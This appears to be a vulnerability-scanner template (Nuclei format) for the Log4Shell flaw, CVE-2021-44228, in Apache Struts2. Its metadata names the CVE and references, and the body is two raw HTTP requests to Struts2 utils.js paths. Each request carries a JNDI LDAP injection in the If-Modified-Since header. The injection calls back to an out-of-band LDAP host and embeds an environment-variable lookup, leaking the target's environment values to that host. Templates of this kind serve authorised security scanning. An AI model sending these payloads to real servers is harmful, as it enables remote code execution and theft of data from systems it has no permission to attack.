id: CVE-2021-44228-struts2-showcase-exploit

info:
  name: Apache Struts2 Log4j JNDI RCE
  author: nvn1729
  severity: high
  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted Apache Struts2.
  reference:
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://twitter.com/sirifu4k1/status/1470946544908185603
  tags: rce,jndi,log4j,struts2,oast,oob

requests:
  - raw:
      - |
        GET /index.action/struts/utils.js HTTP/1.1
        Host: {{Hostname}}
        If-Modified-Since: ${jndi:ldap://{{ldap-ip-port}}/{{base-path}}/{{env-var}}/${{{env-var}}}}
      - |
        GET /struts2-showcase/struts/utils.js HTTP/1.1
        Host: {{Hostname}}
        If-Modified-Since: ${jndi:ldap://{{ldap-ip-port}}/{{base-path}}/{{env-var}}/${{{env-var}}}}